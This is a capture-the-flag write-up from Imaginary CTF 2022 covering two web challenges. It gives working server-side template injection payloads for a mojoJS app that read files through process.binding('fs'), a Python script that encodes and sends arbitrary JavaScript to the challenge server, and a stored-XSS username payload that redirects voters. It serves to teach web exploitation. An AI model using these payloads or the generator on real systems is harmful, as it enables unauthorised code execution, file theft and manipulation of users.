# Imaginary CTF 2022
I played this CTF with my team ***SOter14*** and we were ***ranked 23th out of 800 international teams***. I was dealing with 9 web tasks and managed to **solve 6 out of them**. I felt disappointed for not solving extra 2 tasks after reading their solutions, they were super ez and i overthought them.<br>
- **Intended difficulty**

>| Challenge | Difficulty (1-10) |
>|-----------|-------------------|
>| button    | 1                 |
>| rooCookie | 2                 |
>| maas      | 3                 |
>| SSTI Golf | 4                 |
>| minigolf  | 4                 |
>| Hostility | 4                 |
>| Democracy | 5                 |
>| 1337      | 5                 |
>| CyberCook | 7                 |


## 1337
This Task was pretty decent, I enjoyed it tbh.
### Task description
>C0NV3R7 70/FR0M L337

>Attachments
http://1337.chal.imaginaryctf.org
<br>
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/Imaginary%20CTF%202022/screenshots/task.png"> <br>
### Source Code

```
import mojo from "@mojojs/core";
import Path from "@mojojs/path";

const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};

const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);

const layout = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1337</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <main>
        <%== ctx.content.main %>
    </main>
    <canvas width="500" height="200" id="canv" />
    <script src="static/matrix.js"></script>
</body>
</html>`;

const indexTemplate = `
<h1>C0NV3R7 70/FR0M L337</h1>
<form id="leetform" action="/">
    <input type="text" id="text" name="text" placeholder="Your text here">
    <div class="switch-field">
        <input type="radio" id="dir-to" name="dir" value="to" checked="checked">
        <label for="dir-to">TO</label>
        <input type="radio" id="dir-from" name="dir" value="from">
        <label for="dir-from">FROM</label>
    </div>
    <input type="submit" value="SUBMIT">
</form>
<div id="links">
  <a href="/source">/source</a>
  <a href="/docker">/docker</a>
</div>
`;

const app = mojo();

const leetify = (text, dir) => {
  const charBlocked = ["'", "`", '"'];
  const charMap = dir === "from" ? fromLeet : toLeet;

  const processed = Array.from(text)
    .map((c) => {
      if (c.toUpperCase() in charMap) {
        return charMap[c.toUpperCase()];
      }

      if (charBlocked.includes(c)) {
        return "";
      }

      return c;
    })
    .join("");

  return `<h1>${processed}</h1><a href="/">â†BACK</a>`;
};

app.get("/", async (ctx) => {
  const params = await ctx.params();
  if (params.has("text")) {
    return ctx.render({
      inline: leetify(params.get("text"), params.get("dir")),
      inlineLayout: layout,
    });
  }
  ctx.render({ inline: indexTemplate, inlineLayout: layout });
});

app.get("/source", async (ctx) => {
  const readable = new Path("index.js").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.get("/docker", async (ctx) => {
  const readable = new Path("Dockerfile").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.start();
```
The task was vulnerable to **SSTI** (server side template injection). From the code above it's obvious that it's using mojoJS as template engine :
```
import mojo from "@mojojs/core";
```
To test for SSTI existence, we can try to inject "<%=%>" in the input field, and it gives back "undefined" which is the expected nodeJs response.
#### Problem explained
Basically, our input is passed through query param "text" to a fct called leetify, along side with "dir" param as arguments. 
```app.get("/", async (ctx) => {
  const params = await ctx.params();
  if (params.has("text")) {
    return ctx.render({
      inline: leetify(params.get("text"), params.get("dir")),
      inlineLayout: layout,
    });
  }
  ctx.render({ inline: indexTemplate, inlineLayout: layout });
});
```
Let's dive deep in the fct leetify to see how our input is handled
```
const leetify = (text, dir) => {
  const charBlocked = ["'", "`", '"'];
  const charMap = dir === "from" ? fromLeet : toLeet;

  const processed = Array.from(text)
    .map((c) => {
      if (c.toUpperCase() in charMap) {
        return charMap[c.toUpperCase()];
      }

      if (charBlocked.includes(c)) {
        return "";
      }

      return c;
    })
    .join("");

  return `<h1>${processed}</h1><a href="/">â†BACK</a>`;
};
```
```
const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};

const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);
```
to make it simple:
- chars are uppercased
- ' , " , ` are blacklisted
- when converting text to LEET code : A becomes 4, E becomes 3 ...
```
const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};
```
- when converting back from LEET code we the inverse of to Leet transformation.
```
const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);
```
**The whole problem is how to bypass this input handling limitation and execute NodeJs code on the server side to read internal files, flag probably there.**
### Solution
It's better to deal with converting back from leet to text since it's just converting some numbers back to letters. 
```
require('fs').readdirSync('.')
```
I tested this on my nodeJs interactive locally and it gives back files in the current directory.
To bypass quotes blacklist : 
```
<%=require(String(/aaaaaaaf/).substring(8,9)+String(/aaaaaaas/).substring(8,9)).readdirSync(String(/aaaaaaa./).substring(8,9))%>
```
Note that I'am using 8 and 9 since they are not converted back to letters according to the list mentioned above.
Theoretically, we are all good! <br>
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/Imaginary%20CTF%202022/screenshots/error.png"> <br>
mmm weirdoo ! after some testing I concluded that the author is blocking "require" from executing.
One potential solution that works locally: 
```
(()=>{ return process.binding('fs').readdir(".", (err, files) => {}, undefined, undefined, undefined).toString()})()
```
Remember that we are allowed to use 2,8,9 (they re not converted back to letters) so we can automate the attack by:
- Building whatever Js code char by char with String.fromCharCode() and using only [2,8,9].
- Crafting the payload in the URL
- Receiving back the response from the Server.<br>
**Kudos to my Team mate M0NGI** that came up with the idea! 
Python code is attached in the repo.
```
from urllib.parse import quote as urlencode
import requests
from bs4 import BeautifulSoup

print('Imaginary CTF 1337 task')
code = input('JS CODE >>> ')
a = [ord(c) for c in code]

# a = [ 105, 109, 112, 111, 114, 116, 32, 80, 97, 116, 104, 32, 102, 114, 111, 109, 32, 39, 64, 109, 111, 106, 111, 106, 115, 47, 112, 97, 116, 104, 39, 59 ]

payload = ""
for ind, c in enumerate(a):
 r = ""
 s = 0
 if abs(8*8 - c) < abs(8*8*2 - c):
  r += "8*8"
 else:
  r += "8*8*2"
 
 s = eval(r)
 while c != s:
  if c > s:
   sign = "+"
  else:
   sign = "-"
  
  diff = abs(c-s)
  if diff >= 9:
   r += sign+"9"
  elif diff >= 8:
   r += sign+"9"
  elif diff >= 2:
   r += sign+"2"
  else:
   r += sign+"2/2"
  
  s = eval(r)
 payload += r+"," if ind != len(a)-1 else r

payload = "eval(String.fromCharCode("+payload+"))" 
req = requests.get(f"http://1337.chal.imaginaryctf.org/?text=%3C%25%3D{urlencode(payload)}%25%3E&dir=from")
soup = BeautifulSoup(req.text, "html.parser")
try:
    result = soup.body.main.h1.text
    print(result)
except:
    print('invalid JS code')
```

Finally we can get the flag!  <br>

- Read files in dir


```
 (()=>{ return process.binding('fs').readdir(".", (err, files) => {}, undefined, undefined, undefined).toString()})()
 ```

- open flag --> this will return file descriptor
```
(()=>{ let fid = process.binding('fs').open('FL46_7BVY31.7X7', 0, 0o666, undefined, undefined); return fid;})()
```
- read flag <-- put file descriptor as arg in read()
```
 (()=>{ var buffer = new Buffer(100); process.binding('fs').read(27, buffer, 0, 100, 0, undefined, undefined); return buffer.toString();})()
```
 All these payloads should be crafted with the py script that I mentioned above.

**flag** 
>ictf{M0J0_15N7_0N_P4YL04D54LL7H37H1N65}




## Democracy 
This task is supposed to be one of the hardest (in this CTF), but it was not implemented properly, which make it super ez for me. 
### Task description

> 
>I'm tired of all these skill-based CTF challenges. Y'know what we need more of here? Politics! Simply convince (or strongarm) your fellow competitors to vote for you. The top 1% of players who have the most votes (or top 50, whichever is less) will recieve the flag. This voting will occur 5 times per hour. Keep in mind that no matter how many accounts you make, you can only vote once per IP. Good luck, and happy campaigning!

### Solution
The task was down, thus, i couldn't take some screenshots.
To sum up:
- We were given login/register panel
- Once logged in, you can vote only once
- All users connect at the same time, the one who got most votes is eligible to see flag at endpoint /flag

 One potential **stored XSS** in the registration panel (username field) leads to execute arbitrary JS when the username is displayed for vote. My idea is to redirect every users to vote for me, no need to chain with CSRF since we have the link that leads directly to vote for my account.<br>
 **Final payload** 

> whateverUsername<script\>window.location.replace("taskurl.com/vote-hash")</script\>







